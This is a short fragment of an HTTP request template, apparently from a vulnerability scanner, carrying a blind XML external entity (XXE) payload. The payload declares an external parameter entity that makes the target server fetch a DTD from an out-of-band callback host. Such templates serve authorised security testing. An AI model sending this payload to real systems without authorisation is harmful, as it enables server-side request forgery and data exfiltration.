    Host: {{Hostname}}

    Content-Type: application/xml


    <?xml version="1.0" ?>

    <!DOCTYPE foo [

    <!ENTITY % foo SYSTEM "http://{{interactsh-url}}/{{filename}}.dtd">

    %foo;

    ]>

    '
